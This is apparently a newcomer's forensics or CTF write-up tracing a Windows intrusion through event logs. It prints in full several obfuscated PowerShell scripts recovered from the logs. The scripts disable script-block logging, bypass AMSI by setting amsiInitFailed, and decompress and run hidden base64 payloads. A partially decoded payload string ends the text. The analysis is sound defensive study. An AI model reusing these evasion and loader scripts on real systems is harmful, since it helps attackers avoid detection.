I used FullEventLogView to import and view all logs quickly:
http://www.nirsoft.net/utils/full_event_log_view.html

I never tried to view windows logs for Forensics, but hey, time to learn !

As a newbie, i will start filtering by criticity "high".

![](_attachments/Pasted%20image%2020240406171356.png)

A winRM connection failure... Might be a foothold.


Ahem, something running as NT Authority/System ? Maybe that's not a problem, i don't know ? But looks weird.

![](_attachments/Pasted%20image%2020240406171435.png)

So with these 2 infos, let's try to get more data around their timestamp.

Didn't find much, there are so many logs...
Instead i filtered using event IDs from this page:
https://gist.github.com/githubfoam/69eee155e4edafb2e679fb6ac5ea47d0
1102 4624 4625 4648 4662 4663 4670 4672 4698 4720 4724 4728 4732 4768 4769 4776
Also 4104 is executing remote command.

I found some events:

![](_attachments/Pasted%20image%2020240406180139.png)

This one is running a command using "set strict mode off"... Might be it ?

After many research, i decided to search for "base64", as many hackers like to use it.
And i found these scripts:

![](_attachments/Pasted%20image%2020240406183039.png)
![](_attachments/Pasted%20image%2020240406183053.png)![](_attachments/Pasted%20image%2020240406183103.png)
![](_attachments/Pasted%20image%2020240406183113.png)

Here is their content after reformating a bit:
```powershell
$bfi = (('' + 'En' + 'able{3}c' + '{2}' + 'ipt{1}loc{' + '0}Logging') -f 'k', 'B', 'r', 'S');

$u_Fc = [Collections.Generic.Dictionary[string, System.Object]]::new();

$vsTd = (('Script' + '{0}l' + 'ock{2}og' + 'gi{1}g' + '') -f 'B', 'n', 'L');

If ($PSVersionTable.PSVersion.Major -ge 3) {

    $yi1 = (('{1}nableScr' + 'i{' + '5}tBloc{0}{4}n{' + '2}' + 'o' + 'cat' + 'i' + 'on{3}ogging') -f 'k', 'E', 'v', 'L', 'I', 'p');

    $tNc8 = [Ref].Assembly.GetType((('S' + '{4}stem.{1}' + 'ana' + '{0}ement.{3' + '}{2}' + 'tom' + 'ation.{5}' + 'tils') -f 'g', 'M', 'u', 'A', 'y', 'U'));

    $rfCOr = [Ref].Assembly.GetType((('{' + '2}' + '{0}stem' + '{' + '9}{5' + '}' + 'ana' + '{6}' + 'e' + 'me' + 'n' + 't{9}{8}' + '{' + '4}t{7}m' + 'ati{7' + '}n{' + '9}' + '{8}' + 'm' + 'si{1}ti{3}s' + '') -f 'y', 'U', 'S', 'l', 'u', 'M', 'g', 'o', 'A', '.'));

    $fLkQM = $tNc8.GetField('cachedGroupPolicySettings', 'NonPublic,Static');

    if ($rfCOr) {

        $rfCOr.GetField((('am' + '{1' + '}' + 'i' + 'I' + '{' + '0}i' + '{4}{3}ail' + 'e{2}') -f 'n', 's', 'd', 'F', 't'), 'NonPublic,Static').SetValue($null, $true);

    };

    If ($fLkQM) {

        $kxA8 = $fLkQM.GetValue($null);

        If ($kxA8[$vsTd]) {

            $kxA8[$vsTd][$bfi] = 0; $kxA8[$vsTd][$yi1] = 0;

        } $u_Fc.Add($yi1, 0); $u_Fc.Add($bfi, 0);

        $kxA8['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\' + $vsTd] = $u_Fc;

    }

    Else {

        [Ref].Assembly.GetType((('S{2}{' + '4' + '}t' + 'em.Management.{' + '3}{5}tomat' + 'i' + 'on.Sc' + 'ri' + 'pt{0}{1}ock') -f 'B', 'l', 'y', 'A', 's', 'u')).GetField('signatures', 'NonPublic,Static').SetValue($null, (New-Object Collections.Generic.HashSet[string]));

    }

};

&amp; ([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String((('H4sIABEJw2ICA7VWW2/aSBR+r9T/YFVIGIWAITTNRqq0Y2OCvZDgOhgCRStjD/aU8aX2OEC6/e97xpdcVLqbXanzYs/Muc033zlnNl' + 'noMBKFgp{1}{1}ifDt7RuhHBM7sQNBrDl/RmzSFGp0LjeedmvpnTUVP' + 'griEsVxPwpsEq4uL5UsSXDIinnrCjOUpjhYU4JTsSH8Jcx8nODTm/UX7DDhm{1}D7s3VFo7VNS7GDYjs+Fk5R6PK9UeTYPLSWGVPCxPrnz/' + 'XG8rSzaqlfM5u' + 'mYt08pAwHLZfSekP43uAObw8xFutj4iRRGm{1}Ya0bCs25rGqb2Bl+DtXs8xsyP3LQOh3k' + '6ToJZloTFqbiZQkisw+8kiRzkuglO03pTWHIHy9Xqd3FZev+UhYwE' + 'uKWFDCdRbOLknjg4bQ3t0KX4E96sQMtkCQm9VaMBYvfR' + 'Fou{1}MKO0KfwXM+I{1}3lXYvVZJfK4EUhOWNJpwqUfOOY7cjOJCs34k0IIIDRglGQDA7xzDTcWgXTe0jjDoaaEay3wHQ8' + 'ziJEpJrvxRkJrCGLzbLEoOMK3dJhlurB4RF2r4Yjc4a77WXKfS5ZoIFpZWRNzVk/oLAtSyBy7yczL38YaEuH8I7YA4FV/FY3eCNxTngLQqsWuITqyXG9jtY4o9m3GUOTV+UFMDwh5{1}5YxQFyfIgXtNISq48sbLYIqLE+taOMYBYFfMgau{1}DWQJ' + 'rqTLzDhU3vkchOoKtdO0KUwySFOnKZjYpthtCihMSbmFMhblv/WncMcZZcSxU{1}aZWzVegFk6VaIwZUnmwJ0CALdmjB{1}iU45HUxgSF8sHk3iV8/pRNBSbUsgdsHQPtwErHAWTcaYkEGfBikbLxEwLYooDEMqrxoDaHtSIMkVybtkedutH46zyoCA9h6XC4{1}mUcN' + 'cmjVhTsEjCoAJxiDH6fyH8WHogFiXB5cWIVXIt5QPj7K+tb7bjlFO0R' + 'CjHI2GAxSCJAtlO8XmvqDLiu7ZK+u8n/egBwVAHnwxL' + 'Ns3+0JzOLI{1}0dM/aktHU9+Ff80x0cmZu4+uxQzVy' + 'phsgh5L+3t8gLdXUoXwwOjJyhuSDpcvTKegRZWR' + '82WvIlQNv7t0pO23izzVwpIw8zYOvrPmOLC0kT5ZUc2Qoso5cZWTKvtHrLLT2BeW+ZPJgaiYazrg/wxnqfXsPftRebzjf36LrsY78wY076HQHvkoktDWNobHYXo36aj53+Ny4S{1}WiDu4My+fx4JkVyzN{1}sDCsWPNOdp5hjdq9gS/Dukb2o9hsw+h09Pv' + 'QfRjTi4cxhGtYC53ghebhg4cMhM' + 'y7kJrrnYLUroEkpO63gymsbW+{1}cG+s47F7uBu2f7PGBMcRMlSEBhRSNED2rt/uzKI/DOu9MVWl/WEq7Xfql/ZOJfpuW36nV+fnXnvTm7QtUwuHti9DvAe9tyX6CewFtiXdbdoWx6+vhu2HcE7tidKJ6LrdmZL+B{1}nWCNY5fl9lODfYeG+sI6Xr+BuISfMuDG8ehV{1}7C3ZnHoLoEMeGbHSNY55Rsp2ez' + 'LktfScF+l7icQb6BcTWLWNALNTmbYgPDfumEl6Z2rzr4oHcPnE+vgNWLqckZGfdVS2+6l+d87L99k0tMm+eUfNnXWlsJ6lvU6AstJuqbgyiZFA2kElEuIYo5k+RLU5CTKF5Q3uvMg5RGj' + 'm8geWtBppn0dJ4h5{1}qeVjH/hrCo2DjqbFVS5eXC4gSsjjPsNYIhx7zm9L+TJKgI0l7qZen6+sPp0TxQSysNXlT4+g8mqe5ebBINoIo/nrE4PXCoJD+HLOfwQe+t{1}D4oBAX9YiDKEcRfQ5hcbJHRrwAEJDrwOGX/OVScAVMnOKvQo3xvv78nVCLFxfX8a8lUFlaffi4/0agp7' + 'V/2H0VqaRmDtEPqy8XnnWkX4jAzCYMJE3oEBQXT5' + 'bjQJRJ8+ya8/uBlNiUgz/lbzJ2eg{1}Pw7xP/Q23kxwmRQwAAA{0}{0}') -f '=', '1')))), [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

```powershell
If($PSVersionTable.PSVersion.Major -ge 3){

    $qCt=[Ref].Assembly.GetType((('{2}{1'+'}'+'stem.{'+'4}anagement.{5'+'}{'+'3}t'+'omation.{0}'+'tils')-f'U','y','S','u','M','A'));

    $u_=(('{'+'1}cript{2'+'}{0}ockL'+'oggi'+'ng')-f'l','S','B');

    $sE=(('Ena{2}'+'leSc{'+'3}i{0}t{4}loc{1}Invocat'+'ion{'+'5}'+'og'+'g'+'ing')-f'p','k','b','r','B','L');

    $xH3Rk=(('{0}n'+'abl{2}Scri'+'{3}t{1}l'+'ock'+'Loggi'+'ng')-f'E','B','e','p');

    $kF=[Ref].Assembly.GetType((('{2}'+'{5'+'}st'+'em.{'+'4'+'}'+'a{'+'9'+'}a{3'+'}eme'+'{'+'9'+'}t'+'.{7}{'+'1}t{8}'+'mat'+'i{'+'8'+'}'+'{9}.{7}msi{6}ti{0}'+'s')-f'l','u','S','g','M','y','U','A','o','n'));

    $q7f_m=$qCt.GetField('cachedGroupPolicySettings','NonPublic,Static');

    if ($kF) {

        $kF.GetField((('a'+'m'+'siI{0'+'}'+'i{2}Fai'+'{4}{'+'1'+'}{3'+'}')-f'n','e','t','d','l'),'NonPublic,Static').SetValue($null,$true);

    };

    If ($q7f_m) {

        $vQpeQ=$q7f_m.GetValue($null);

        $eFh0t=[Collections.Generic.Dictionary[string,System.Object]]::new();

        If($vQpeQ[$u_]){

            $vQpeQ[$u_][$xH3Rk]=0; $vQpeQ[$u_][$sE]=0;

        }

        $eFh0t.Add($xH3Rk,0); $eFh0t.Add($sE,0); $vQpeQ['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$u_]=$eFh0t;

    }

    Else {

        [Ref].Assembly.GetType((('S'+'{5}{1}t'+'em.Manageme'+'n'+'t.A{0}tomati'+'on.Sc{4}ip'+'t{'+'2}{3}oc'+'k')-f'u','s','B','l','r','y')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));

    }

}

;&amp;

([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIA{0}QKw2ICA7VWW2/iOBR+H2n+QzRCIqgUAqWdbqWRNoEEwkBLmnIpDFqFxCQ'+'ujp1JTLnMzn/f45CUzk67211p/JLY{0}jd//s45Xq6pyzGjEtnf'+'Yunb+3dSNgZ'+'O7ISSXIhucDsuS4WderYoHbcL/kD6JMkzNYpaLHQwnV{1}dNddxjCg/zCttxNUkQeGCYJTIJel{0}aRygGJ3eLB6Qy6VvUuG{0}Spu'+'whUMysV3TcQMknarUE3s{1}5joisoodEczl4pcvxdLstDav6F/XDknkor1LOAorHiHFkvS{1}JBze7SIkF/vYjVnClrwyxvSsXhn'+'SxFmia7D2i{0}qIB8xLinCU42FixNcxFWcSRg4i'+'chF+BzFzVc+LUZIUy{1}JMmJ/N57/Ls8z37ZpyHKKKSTmKWWSj+BG7KKl0HOoRdIuWc{'+'1}CyeYyp{0}y+VQOyRrZBcoGtCytJ/MSNfo02O3FuV5OdKIDXgcakMN/rTKfvMWxN00Cu+EOaBAyUYOQ8Ave8CwGXOHu/OGr3AnuNC{0}mbpDoKQ5QFLcKr8SVLKUh/cO5zFO5gW7uI1Ks2fAJcKwZnDy2+1VstVQfGB8XoMa7MRw{1}78aOGH+y+wz58f6kLqdTq30BJT1NpRJ8Ruzlj5pXtBS4JSVCq5'+'2DXEKBezDeS1EEG+wwXWgh4/qekh5k+62hoTD8WqC3ebQFRw7aUfgzlcn1w0aR+FAOBhDnwtLCF{0}UC6d5cYu{1}y7mIFRsEidJ'+'ytJgDYnqliUbOQR5ZUmlCc621DVn6W/xGG5/TTh2nYTn5ualv+OZ+W0ymvB47cLdAgZ3doRc7BABSVnqYA{1}pOxv7uf/ii4A0HUIghcDSI1wIrAggbC4YE0OoKTtK'+'FRtxM4wICkEmrRwGcXyoE1mipBRzfOQVX4s0T4kD/wU2OSj{0}4oQLtwnjZWmEYw6FSOCckux/xfFzDToE1IxRdkVynmszbcdFMhT2{0}cHUDKUUk5gDHkbMQs1J0EXjUHDkD1Udt84HLbZXYejGrTXSbLvVsadD3BuG2q1tcrutwz/WxrZ6cmavouu+S0x81rVATo1b22Cpmompd7SdVdNUt4M/jrraUOjjZs{1}62Jqqp4X+xL{1}vbsxBMDHBUb{0}nmz58NTNwNWWq+JpicrNtaDpWVN+2OlajNk3{1}VC+Jh'+'ve2aaudsfBnuZ1uy{1}mCH73R6Ey2d+p1v6sGxo1n1OpGI{0}RXQn+6avdaejp3xdy6T3Ssgx/duLdGARq{0}Im2sG1'+'NrFJn+yca3Rr1qwwg0WDfxthfZVRi1WveRevs+udz3IVxrNO1iNDV{1}t{0}NVS1Xte0rsxaap6nVLjxoX+6ExhLXVnUm31iLqe7v7TvW3UR+jiKmWrqoGgUwNVWfTqtbG7LM1OreGurLdDZXtRn+obnTc3ayy77B{1}ceFXl41BdWSbtOMEGsS76zZWuHsCe6EzUu6X1ZHAr6XT6p'+'5OiDNo1hhZVGtD3{0}qoaSZGXYHhVw'+'3ODDbOrQVr1t1gCTGZ/qXlTxitOyuwO/ZViA7OF5h42TVBR1sTvBqeTISt7kYJu1tFxBl2LyG2ehaDyqk5qUJ8aqdlN2nbNid1Dxla{1}cT{1}{1}AEoORtiys/q88Ii8kQBf/+uEITnj8+Y+Vp/6jtxEjgEGAutJ68eBouNrJcMGBYaspy+SFYopohAE4c2n6ecSghzRStLuw600UNzE712aKZRvfRXkp4ES8cmly{1}dXU0hSsjhfa/SQ{1}TnQVnZnikKdCZl'+'qzTSVH37yZos2sl'+'gqiw6WwrMwTJJLYMxvJRk+dcjBe8XDjX0daxegw'+'18r'+'6DiQQ0+1CABnsYYeQ5ddq4nJhyRA8'+'hqc{0}CZeLkIgoD6KfoqFbho68+fCQXa/7WMyepoAB/v'+'3xhz'+'X{0}uH3TexSCkfs{0}lp+ceFZ33oF0IwdjAHSRtaAkGHp8rLSGRp8vwB2IckWGZDvOBv1vz0Gl6FaUv6C4yyAlo7DAAA')-f'P','9')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

```powershell
if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $bfi=((''''+''En''+''able{3}c''+''{2}''+''ipt{1}loc{''+''0}Logging'')-f''k'',''B'',''r'',''S''); $u_Fc=[Collections.Generic.Dictionary[string,System.Object]]::new(); $vsTd=((''Script''+''{0}l''+''ock{2}og''+''gi{1}g''+'''')-f''B'',''n'',''L'');If($PSVersionTable.PSVersion.Major -ge 3){ $yi1=((''{1}nableScr''+''i{''+''5}tBloc{0}{4}n{''+''2}''+''o''+''cat''+''i''+''on{3}ogging'')-f''k'',''E'',''v'',''L'',''I'',''p''); $tNc8=[Ref].Assembly.GetType(((''S''+''{4}stem.{1}''+''ana''+''{0}ement.{3''+''}{2}''+''tom''+''ation.{5}''+''tils'')-f''g'',''M'',''u'',''A'',''y'',''U'')); $rfCOr=[Ref].Assembly.GetType(((''{''+''2}''+''{0}stem''+''{''+''9}{5''+''}''+''ana''+''{6}''+''e''+''me''+''n''+''t{9}{8}''+''{''+''4}t{7}m''+''ati{7''+''}n{''+''9}''+''{8}''+''m''+''si{1}ti{3}s''+'''')-f''y'',''U'',''S'',''l'',''u'',''M'',''g'',''o'',''A'',''.'')); $fLkQM=$tNc8.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); if ($rfCOr) { $rfCOr.GetField(((''am''+''{1''+''}''+''i''+''I''+''{''+''0}i''+''{4}{3}ail''+''e{2}'')-f''n'',''s'',''d'',''F'',''t''),''NonPublic,Static'').SetValue($null,$true); }; If ($fLkQM) { $kxA8=$fLkQM.GetValue($null); If($kxA8[$vsTd]){ $kxA8[$vsTd][$bfi]=0; $kxA8[$vsTd][$yi1]=0; } $u_Fc.Add($yi1,0); $u_Fc.Add($bfi,0); $kxA8[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$vsTd]=$u_Fc; } Else { [Ref].Assembly.GetType(((''S{2}{''+''4''+''}t''+''em.Management.{''+''3}{5}tomat''+''i''+''on.Sc''+''ri''+''pt{0}{1}ock'')-f''B'',''l'',''y'',''A'',''s'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABEJw2ICA7VWW2/aSBR+r9T/YFVIGIWAITTNRqq0Y2OCvZDgOhgCRStjD/aU8aX2OEC6/e97xpdcVLqbXanzYs/Muc033zlnNl''+''noMBKFgp{1}{1}ifDt7RuhHBM7sQNBrDl/RmzSFGp0LjeedmvpnTUVP''+''griEsVxPwpsEq4uL5UsSXDIinnrCjOUpjhYU4JTsSH8Jcx8nODTm/UX7DDhm{1}D7s3VFo7VNS7GDYjs+Fk5R6PK9UeTYPLSWGVPCxPrnz/''+''XG8rSzaqlfM5u''+''mYt08pAwHLZfSekP43uAObw8xFutj4iRRGm{1}Ya0bCs25rGqb2Bl+DtXs8xsyP3LQOh3k''+''6ToJZloTFqbiZQkisw+8kiRzkuglO03pTWHIHy9Xqd3FZev+UhYwE''+''uKWFDCdRbOLknjg4bQ3t0KX4E96sQMtkCQm9VaMBYvfR''+''Fou{1}MKO0KfwXM+I{1}3lXYvVZJfK4EUhOWNJpwqUfOOY7cjOJCs34k0IIIDRglGQDA7xzDTcWgXTe0jjDoaaEay3wHQ8''+''ziJEpJrvxRkJrCGLzbLEoOMK3dJhlurB4RF2r4Yjc4a77WXKfS5ZoIFpZWRNzVk/oLAtSyBy7yczL38YaEuH8I7YA4FV/FY3eCNxTngLQqsWuITqyXG9jtY4o9m3GUOTV+UFMDwh5{1}5YxQFyfIgXtNISq48sbLYIqLE+taOMYBYFfMgau{1}DWQJ''+''rqTLzDhU3vkchOoKtdO0KUwySFOnKZjYpthtCihMSbmFMhblv/WncMcZZcSxU{1}aZWzVegFk6VaIwZUnmwJ0CALdmjB{1}iU45HUxgSF8sHk3iV8/pRNBSbUsgdsHQPtwErHAWTcaYkEGfBikbLxEwLYooDEMqrxoDaHtSIMkVybtkedutH46zyoCA9h6XC4{1}mUcN''+''cmjVhTsEjCoAJxiDH6fyH8WHogFiXB5cWIVXIt5QPj7K+tb7bjlFO0R''+''CjHI2GAxSCJAtlO8XmvqDLiu7ZK+u8n/egBwVAHnwxL''+''Ns3+0JzOLI{1}0dM/aktHU9+Ff80x0cmZu4+uxQzVy''+''phsgh5L+3t8gLdXUoXwwOjJyhuSDpcvTKegRZWR''+''82WvIlQNv7t0pO23izzVwpIw8zYOvrPmOLC0kT5ZUc2Qoso5cZWTKvtHrLLT2BeW+ZPJgaiYazrg/wxnqfXsPftRebzjf36LrsY78wY076HQHvkoktDWNobHYXo36aj53+Ny4S{1}WiDu4My+fx4JkVyzN{1}sDCsWPNOdp5hjdq9gS/Dukb2o9hsw+h09Pv''+''QfRjTi4cxhGtYC53ghebhg4cMhM''+''y7kJrrnYLUroEkpO63gymsbW+{1}cG+s47F7uBu2f7PGBMcRMlSEBhRSNED2rt/uzKI/DOu9MVWl/WEq7Xfql/ZOJfpuW36nV+fnXnvTm7QtUwuHti9DvAe9tyX6CewFtiXdbdoWx6+vhu2HcE7tidKJ6LrdmZL+B{1}nWCNY5fl9lODfYeG+sI6Xr+BuISfMuDG8ehV{1}7C3ZnHoLoEMeGbHSNY55Rsp2ez''+''LktfScF+l7icQb6BcTWLWNALNTmbYgPDfumEl6Z2rzr4oHcPnE+vgNWLqckZGfdVS2+6l+d87L99k0tMm+eUfNnXWlsJ6lvU6AstJuqbgyiZFA2kElEuIYo5k+RLU5CTKF5Q3uvMg5RGj''+''m8geWtBppn0dJ4h5{1}qeVjH/hrCo2DjqbFVS5eXC4gSsjjPsNYIhx7zm9L+TJKgI0l7qZen6+sPp0TxQSysNXlT4+g8mqe5ebBINoIo/nrE4PXCoJD+HLOfwQe+t{1}D4oBAX9YiDKEcRfQ5hcbJHRrwAEJDrwOGX/OVScAVMnOKvQo3xvv78nVCLFxfX8a8lUFlaffi4/0agp7''+''V/2H0VqaRmDtEPqy8XnnWkX4jAzCYMJE3oEBQXT5''+''bjQJRJ8+ya8/uBlNiUgz/lbzJ2eg{1}Pw7xP/Q23kxwmRQwAAA{0}{0}'')-f''='',''1'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
```

```powershell
if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c If($PSVersionTable.PSVersion.Major -ge 3){ $qCt=[Ref].Assembly.GetType(((''{2}{1''+''}''+''stem.{''+''4}anagement.{5''+''}{''+''3}t''+''omation.{0}''+''tils'')-f''U'',''y'',''S'',''u'',''M'',''A'')); $u_=((''{''+''1}cript{2''+''}{0}ockL''+''oggi''+''ng'')-f''l'',''S'',''B''); $sE=((''Ena{2}''+''leSc{''+''3}i{0}t{4}loc{1}Invocat''+''ion{''+''5}''+''og''+''g''+''ing'')-f''p'',''k'',''b'',''r'',''B'',''L''); $xH3Rk=((''{0}n''+''abl{2}Scri''+''{3}t{1}l''+''ock''+''Loggi''+''ng'')-f''E'',''B'',''e'',''p''); $kF=[Ref].Assembly.GetType(((''{2}''+''{5''+''}st''+''em.{''+''4''+''}''+''a{''+''9''+''}a{3''+''}eme''+''{''+''9''+''}t''+''.{7}{''+''1}t{8}''+''mat''+''i{''+''8''+''}''+''{9}.{7}msi{6}ti{0}''+''s'')-f''l'',''u'',''S'',''g'',''M'',''y'',''U'',''A'',''o'',''n'')); $q7f_m=$qCt.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); if ($kF) { $kF.GetField(((''a''+''m''+''siI{0''+''}''+''i{2}Fai''+''{4}{''+''1''+''}{3''+''}'')-f''n'',''e'',''t'',''d'',''l''),''NonPublic,Static'').SetValue($null,$true); }; If ($q7f_m) { $vQpeQ=$q7f_m.GetValue($null); $eFh0t=[Collections.Generic.Dictionary[string,System.Object]]::new(); If($vQpeQ[$u_]){ $vQpeQ[$u_][$xH3Rk]=0; $vQpeQ[$u_][$sE]=0; } $eFh0t.Add($xH3Rk,0); $eFh0t.Add($sE,0); $vQpeQ[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$u_]=$eFh0t; } Else { [Ref].Assembly.GetType(((''S''+''{5}{1}t''+''em.Manageme''+''n''+''t.A{0}tomati''+''on.Sc{4}ip''+''t{''+''2}{3}oc''+''k'')-f''u'',''s'',''B'',''l'',''r'',''y'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIA{0}QKw2ICA7VWW2/iOBR+H2n+QzRCIqgUAqWdbqWRNoEEwkBLmnIpDFqFxCQ''+''ujp1JTLnMzn/f45CUzk67211p/JLY{0}jd//s45Xq6pyzGjEtnf''+''Yunb+3dSNgZ''+''O7ISSXIhucDsuS4WderYoHbcL/kD6JMkzNYpaLHQwnV{1}dNddxjCg/zCttxNUkQeGCYJTIJel{0}aRygGJ3eLB6Qy6VvUuG{0}Spu''+''whUMysV3TcQMknarUE3s{1}5joisoodEczl4pcvxdLstDav6F/XDknkor1LOAorHiHFkvS{1}JBze7SIkF/vYjVnClrwyxvSsXhn''+''SxFmia7D2i{0}qIB8xLinCU42FixNcxFWcSRg4i''+''chF+BzFzVc+LUZIUy{1}JMmJ/N57/Ls8z37ZpyHKKKSTmKWWSj+BG7KKl0HOoRdIuWc{''+''1}CyeYyp{0}y+VQOyRrZBcoGtCytJ/MSNfo02O3FuV5OdKIDXgcakMN/rTKfvMWxN00Cu+EOaBAyUYOQ8Ave8CwGXOHu/OGr3AnuNC{0}mbpDoKQ5QFLcKr8SVLKUh/cO5zFO5gW7uI1Ks2fAJcKwZnDy2+1VstVQfGB8XoMa7MRw{1}78aOGH+y+wz58f6kLqdTq30BJT1NpRJ8Ruzlj5pXtBS4JSVCq5''+''2DXEKBezDeS1EEG+wwXWgh4/qekh5k+62hoTD8WqC3ebQFRw7aUfgzlcn1w0aR+FAOBhDnwtLCF{0}UC6d5cYu{1}y7mIFRsEidJ''+''ytJgDYnqliUbOQR5ZUmlCc621DVn6W/xGG5/TTh2nYTn5ualv+OZ+W0ymvB47cLdAgZ3doRc7BABSVnqYA{1}pOxv7uf/ii4A0HUIghcDSI1wIrAggbC4YE0OoKTtK''+''FRtxM4wICkEmrRwGcXyoE1mipBRzfOQVX4s0T4kD/wU2OSj{0}4oQLtwnjZWmEYw6FSOCckux/xfFzDToE1IxRdkVynmszbcdFMhT2{0}cHUDKUUk5gDHkbMQs1J0EXjUHDkD1Udt84HLbZXYejGrTXSbLvVsadD3BuG2q1tcrutwz/WxrZ6cmavouu+S0x81rVATo1b22Cpmompd7SdVdNUt4M/jrraUOjjZs{1}62Jqqp4X+xL{1}vbsxBMDHBUb{0}nmz58NTNwNWWq+JpicrNtaDpWVN+2OlajNk3{1}VC+Jh''+''ve2aaudsfBnuZ1uy{1}mCH73R6Ey2d+p1v6sGxo1n1OpGI{0}RXQn+6avdaejp3xdy6T3Ssgx/duLdGARq{0}Im2sG1''+''NrFJn+yca3Rr1qwwg0WDfxthfZVRi1WveRevs+udz3IVxrNO1iNDV{1}t{0}NVS1Xte0rsxaap6nVLjxoX+6ExhLXVnUm31iLqe7v7TvW3UR+jiKmWrqoGgUwNVWfTqtbG7LM1OreGurLdDZXtRn+obnTc3ayy77B{1}ceFXl41BdWSbtOMEGsS76zZWuHsCe6EzUu6X1ZHAr6XT6p''+''5OiDNo1hhZVGtD3{0}qoaSZGXYHhVw''+''3ODDbOrQVr1t1gCTGZ/qXlTxitOyuwO/ZViA7OF5h42TVBR1sTvBqeTISt7kYJu1tFxBl2LyG2ehaDyqk5qUJ8aqdlN2nbNid1Dxla{1}cT{1}{1}AEoORtiys/q88Ii8kQBf/+uEITnj8+Y+Vp/6jtxEjgEGAutJ68eBouNrJcMGBYaspy+SFYopohAE4c2n6ecSghzRStLuw600UNzE712aKZRvfRXkp4ES8cmly{1}dXU0hSsjhfa/SQ{1}TnQVnZnikKdCZl''+''qzTSVH37yZos2sl''+''gqiw6WwrMwTJJLYMxvJRk+dcjBe8XDjX0daxegw''+''18r''+''6DiQQ0+1CABnsYYeQ5ddq4nJhyRA8''+''hqc{0}CZeLkIgoD6KfoqFbho68+fCQXa/7WMyepoAB/v''+''3xhz''+''X{0}uH3TexSCkfs{0}lp+ceFZ33oF0IwdjAHSRtaAkGHp8rLSGRp8vwB2IckWGZDvOBv1vz0Gl6FaUv6C4yyAlo7DAAA'')-f''P'',''9'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
```

Ok i didn't deobfuscate the last one, because i think this is just a script running the command that's in base64.

So let's decode it.
I extracted the base64 and removed the obfuscation:
```
H4sIAPQKw2ICA7VWW2/iOBR+H2n+QzRCIqgUAqWdbqWRNoEEwkBLmnIpDFqFxCQujp1JTLnMzn/f45CUzk67211p/JLYPjd//s45Xq6pyzGjEtnfYunb+3dSNgZO7ISSXIhucDsuS4WderYoHbcL/kD6JMkzNYpaLHQwnV9dNddxjCg/zCttxNUkQeGCYJTIJelPaRygGJ3eLB6Qy6VvUuGPSpuwhUMysV3TcQMknarUE3s95joisoodEczl4pcvxdLstDav6F/XDknkor1LOAorHiHFkvS9JBze7SIkF/vYjVnClrwyxvSsXhnSxFmia7D2iPqIB8xLinCU42FixNcxFWcSRg4ichF+BzFzVc+LUZIUy9JMmJ/N57/Ls8z37ZpyHKKKSTmKWWSj+BG7KKl0HOoRdIuWc9CyeYypPy+VQOyRrZBcoGtCytJ/MSNfo02O3FuV5OdKIDXgcakMN/rTKfvMWxN00Cu+EOaBAyUYOQ8Ave8CwGXOHu/OGr3AnuNCPmbpDoKQ5QFLcKr8SVLKUh/cO5zFO5gW7uI1Ks2fAJcKwZnDy2+1VstVQfGB8XoMa7MRw978aOGH+y+wz58f6kLqdTq30BJT1NpRJ8Ruzlj5pXtBS4JSVCq52DXEKBezDeS1EEG+wwXWgh4/qekh5k+62hoTD8WqC3ebQFRw7aUfgzlcn1w0aR+FAOBhDnwtLCFPUC6d5cYu9y7mIFRsEidJytJgDYnqliUbOQR5ZUmlCc621DVn6W/xGG5/TTh2nYTn5ualv+OZ+W0ymvB47cLdAgZ3doRc7BABSVnqYA9pOxv7uf/ii4A0HUIghcDSI1wIrAggbC4YE0OoKTtKFRtxM4wICkEmrRwGcXyoE1mipBRzfOQVX4s0T4kD/wU2OSjP4oQLtwnjZWmEYw6FSOCckux/xfFzDToE1IxRdkVynmszbcdFMhT2PcHUDKUUk5gDHkbMQs1J0EXjUHDkD1Udt84HLbZXYejGrTXSbLvVsadD3BuG2q1tcrutwz/WxrZ6cmavouu+S0x81rVATo1b22Cpmompd7SdVdNUt4M/jrraUOjjZs962Jqqp4X+xL9vbsxBMDHBUbPnmz58NTNwNWWq+JpicrNtaDpWVN+2OlajNk39VC+Jhve2aaudsfBnuZ1uy9mCH73R6Ey2d+p1v6sGxo1n1OpGIPRXQn+6avdaejp3xdy6T3Ssgx/duLdGARqPIm2sG1NrFJn+yca3Rr1qwwg